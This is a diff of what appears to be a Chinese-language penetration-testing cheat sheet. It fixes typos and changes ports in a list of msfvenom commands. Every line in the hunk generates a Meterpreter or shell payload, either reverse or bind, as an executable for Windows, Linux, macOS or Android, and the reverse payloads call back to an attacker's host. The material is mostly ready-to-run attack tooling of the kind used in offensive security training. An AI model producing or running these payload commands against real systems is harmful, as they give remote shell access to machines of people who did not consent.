@@ -62,17 +62,19 @@ https://micro8.gitbook.io/micro8/contents-1/1-10/10msfvenom-chang-yong-sheng-che
 # Windows
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=1234 -f exe > shell.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1234 -f exe > shell.exe
-msfvenom -p windows/meterpreter/bind_tcp LPORT=5555 -f exe >bind.exe
+msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f exe >bind.exe
 msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$ip LPORT=1234  -f raw -o payload.ps1
 msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.2.157 -e x86/shikata_ga_nai -b "\x00" -f py 
 # 默认的stageless payload只会包含stageless，所以如果想将stdapi和priv两个组建给包含进去的华我们可以用extensions命令：
 msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.52.1 LPORT=4444 EXTENSIONS=stdapi,priv -f exe -o stageless.exe
 
 # Linux
-msfyenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.50.80 LPORT=1234 -f elf > shell.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.50.80 LPORT=1234 -a x86 --platform Linux -f elf > shell.elf
+msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.93.20 LPORT=1234 -a x86 --platform Linux -f elf > shell.elf
 
 # Mac
-msfyenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho>shell.macho
 
 # Android
 msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw > shell.apk
